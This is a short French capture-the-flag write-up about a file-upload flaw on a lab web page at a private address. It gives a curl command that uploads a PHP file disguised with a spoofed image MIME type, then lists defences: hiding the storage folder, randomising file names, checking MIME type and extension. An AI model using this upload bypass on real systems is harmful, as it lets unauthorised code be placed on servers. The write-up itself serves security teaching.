# Explications

Sur la page : /?page=upload

Il est possible d'upload un fichier qui n'est pas une image.

    curl -X POST -F "uploaded=@/tmp/test.php;type=image/jpg" -F "Upload=Upload"  "http://192.168.1.11/index.php?page=upload"  | grep "flag"

Lorsque l'on upload une image, on voit que le dossier de stockage est **/tmp**. 
Avec curl on peut  faire la requetes en indiquant soi-meme le type du fichier.


# Protection
Ne pas reveler le dossier de stockage.
Générer un nom aléatoire pour les fichiers.
Vérifier le mime et l'extension des fichiers.

